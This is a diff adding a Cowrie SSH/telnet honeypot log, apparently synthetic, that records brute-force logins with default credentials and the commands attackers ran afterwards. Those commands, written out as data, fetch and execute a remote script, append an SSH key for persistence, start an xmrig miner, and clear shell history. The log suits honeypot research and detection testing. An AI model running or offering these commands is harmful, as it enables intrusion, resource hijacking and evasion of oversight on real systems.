@@ -1,0 +1,750 @@
+{"timestamp": "2026-11-01T00:15:00.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 46715, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T00:15:00.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T00:15:00.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-01T00:15:04.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "password"}
+{"timestamp": "2026-11-01T00:15:09.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-01T00:15:12.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "ubuntu"}
+{"timestamp": "2026-11-01T00:15:17.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "12345678"}
+{"timestamp": "2026-11-01T00:16:22.000000Z", "src_ip": "203.0.113.123", "session": "793556ef", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 103.2}
+{"timestamp": "2026-11-01T00:28:00.000000Z", "src_ip": "198.51.100.52", "session": "c53a1252", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 59157, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T00:28:00.000000Z", "src_ip": "198.51.100.52", "session": "c53a1252", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T00:28:00.000000Z", "src_ip": "198.51.100.52", "session": "c53a1252", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T00:28:01.000000Z", "src_ip": "198.51.100.52", "session": "c53a1252", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "qwerty"}
+{"timestamp": "2026-11-01T00:28:04.000000Z", "src_ip": "198.51.100.52", "session": "c53a1252", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "password"}
+{"timestamp": "2026-11-01T00:28:08.000000Z", "src_ip": "198.51.100.52", "session": "c53a1252", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "root"}
+{"timestamp": "2026-11-01T00:29:36.000000Z", "src_ip": "198.51.100.52", "session": "c53a1252", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 80.3}
+{"timestamp": "2026-11-01T00:46:00.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 31236, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T00:46:00.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T00:46:00.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-01T00:46:05.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "root"}
+{"timestamp": "2026-11-01T00:46:06.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "oracle", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-01T00:46:22.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-01T00:46:27.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-01T00:46:36.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-01T00:48:27.000000Z", "src_ip": "198.51.100.18", "session": "caa59308", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 83.9}
+{"timestamp": "2026-11-01T08:26:00.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 50455, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T08:26:00.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-01T08:26:00.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T08:26:05.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "password"}
+{"timestamp": "2026-11-01T08:26:07.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "root"}
+{"timestamp": "2026-11-01T08:26:12.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "root"}
+{"timestamp": "2026-11-01T08:26:32.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-01T08:26:38.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-01T08:26:48.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-01T08:26:48.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-01T08:27:36.000000Z", "src_ip": "198.51.100.12", "session": "6c8b72c8", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 11.9}
+{"timestamp": "2026-11-01T10:48:00.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 33622, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T10:48:00.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T10:48:00.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T10:48:03.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "ubuntu"}
+{"timestamp": "2026-11-01T10:48:05.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "root"}
+{"timestamp": "2026-11-01T10:48:10.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "123456"}
+{"timestamp": "2026-11-01T10:48:12.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "ubuntu"}
+{"timestamp": "2026-11-01T10:48:15.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "12345678"}
+{"timestamp": "2026-11-01T10:49:34.000000Z", "src_ip": "198.51.100.14", "session": "89b161c0", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 15.3}
+{"timestamp": "2026-11-01T10:55:00.000000Z", "src_ip": "203.0.113.101", "session": "9bc89994", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 44113, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T10:55:00.000000Z", "src_ip": "203.0.113.101", "session": "9bc89994", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-01T10:55:00.000000Z", "src_ip": "203.0.113.101", "session": "9bc89994", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-01T10:55:04.000000Z", "src_ip": "203.0.113.101", "session": "9bc89994", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "ubuntu"}
+{"timestamp": "2026-11-01T10:55:06.000000Z", "src_ip": "203.0.113.101", "session": "9bc89994", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "root"}
+{"timestamp": "2026-11-01T10:55:11.000000Z", "src_ip": "203.0.113.101", "session": "9bc89994", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-01T10:56:29.000000Z", "src_ip": "203.0.113.101", "session": "9bc89994", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 43.2}
+{"timestamp": "2026-11-01T12:04:00.000000Z", "src_ip": "198.51.100.38", "session": "ee2bb94e", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 50926, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-01T12:04:03.000000Z", "src_ip": "198.51.100.38", "session": "ee2bb94e", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "admin"}
+{"timestamp": "2026-11-01T12:04:07.000000Z", "src_ip": "198.51.100.38", "session": "ee2bb94e", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "admin", "password": "password"}
+{"timestamp": "2026-11-01T12:04:18.000000Z", "src_ip": "198.51.100.38", "session": "ee2bb94e", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-01T12:04:22.000000Z", "src_ip": "198.51.100.38", "session": "ee2bb94e", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-01T12:05:32.000000Z", "src_ip": "198.51.100.38", "session": "ee2bb94e", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 94.9}
+{"timestamp": "2026-11-01T12:23:00.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 53821, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T12:23:00.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-01T12:23:00.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T12:23:04.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "password"}
+{"timestamp": "2026-11-01T12:23:07.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-01T12:23:12.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "123456"}
+{"timestamp": "2026-11-01T12:23:13.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-01T12:23:14.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "12345678"}
+{"timestamp": "2026-11-01T12:23:49.000000Z", "src_ip": "203.0.113.127", "session": "a180fe3e", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 105.0}
+{"timestamp": "2026-11-01T12:26:00.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 54590, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T12:26:00.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T12:26:00.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T12:26:05.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "password"}
+{"timestamp": "2026-11-01T12:26:09.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "root"}
+{"timestamp": "2026-11-01T12:26:12.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "qwerty"}
+{"timestamp": "2026-11-01T12:26:15.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "12345678"}
+{"timestamp": "2026-11-01T12:26:16.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "ubuntu", "password": "123456"}
+{"timestamp": "2026-11-01T12:26:33.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-01T12:26:39.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-01T12:26:43.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-01T12:26:53.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-01T12:28:33.000000Z", "src_ip": "198.51.100.10", "session": "02c4b76f", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 74.8}
+{"timestamp": "2026-11-01T13:01:00.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 36564, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T13:01:00.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-01T13:01:00.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-01T13:01:02.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-01T13:01:07.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "password"}
+{"timestamp": "2026-11-01T13:01:14.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-01T13:01:23.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-01T13:01:41.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-01T13:03:08.000000Z", "src_ip": "198.51.100.37", "session": "664a7421", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 105.3}
+{"timestamp": "2026-11-01T13:42:00.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 56006, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T13:42:00.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-01T13:42:00.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-01T13:42:04.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "root"}
+{"timestamp": "2026-11-01T13:42:07.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-01T13:42:08.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "raspberry"}
+{"timestamp": "2026-11-01T13:42:09.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-01T13:42:12.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "admin"}
+{"timestamp": "2026-11-01T13:42:14.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "qwerty"}
+{"timestamp": "2026-11-01T13:42:18.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "123456"}
+{"timestamp": "2026-11-01T13:42:34.000000Z", "src_ip": "203.0.113.137", "session": "645af88d", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 119.1}
+{"timestamp": "2026-11-01T18:26:00.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 58236, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T18:26:00.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T18:26:00.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T18:26:02.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "raspberry"}
+{"timestamp": "2026-11-01T18:26:03.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-01T18:26:05.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-01T18:26:07.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "root"}
+{"timestamp": "2026-11-01T18:26:22.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-01T18:26:24.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-01T18:27:20.000000Z", "src_ip": "203.0.113.106", "session": "91f60569", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 30.4}
+{"timestamp": "2026-11-01T18:36:00.000000Z", "src_ip": "198.51.100.56", "session": "1ea52600", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 45780, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-01T18:36:00.000000Z", "src_ip": "198.51.100.56", "session": "1ea52600", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T18:36:00.000000Z", "src_ip": "198.51.100.56", "session": "1ea52600", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T18:36:05.000000Z", "src_ip": "198.51.100.56", "session": "1ea52600", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "raspberry"}
+{"timestamp": "2026-11-01T18:36:14.000000Z", "src_ip": "198.51.100.56", "session": "1ea52600", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 65.4}
+{"timestamp": "2026-11-01T19:40:00.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 54232, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T19:40:00.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-01T19:40:00.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T19:40:05.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "user", "password": "qwerty"}
+{"timestamp": "2026-11-01T19:40:22.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-01T19:40:34.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-01T19:40:42.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-01T19:41:00.000000Z", "src_ip": "198.51.100.10", "session": "d9f64aad", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 48215, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T19:41:00.000000Z", "src_ip": "198.51.100.10", "session": "d9f64aad", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-01T19:41:00.000000Z", "src_ip": "198.51.100.10", "session": "d9f64aad", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T19:41:01.000000Z", "src_ip": "198.51.100.10", "session": "d9f64aad", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-01T19:41:05.000000Z", "src_ip": "198.51.100.10", "session": "d9f64aad", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "ubuntu"}
+{"timestamp": "2026-11-01T19:41:13.000000Z", "src_ip": "198.51.100.10", "session": "d9f64aad", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 24.1}
+{"timestamp": "2026-11-01T19:42:30.000000Z", "src_ip": "203.0.113.137", "session": "4dd2acd1", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 29.7}
+{"timestamp": "2026-11-01T21:31:00.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 33724, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-01T21:31:00.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-01T21:31:00.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-01T21:31:04.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-01T21:31:06.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "123456"}
+{"timestamp": "2026-11-01T21:31:07.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-01T21:31:08.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-01T21:31:12.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "admin"}
+{"timestamp": "2026-11-01T21:31:15.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "123456"}
+{"timestamp": "2026-11-01T21:31:16.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "ubuntu", "password": "raspberry"}
+{"timestamp": "2026-11-01T21:31:17.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-01T21:31:31.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-01T21:31:49.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-01T21:31:50.000000Z", "src_ip": "198.51.100.10", "session": "1332e641", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
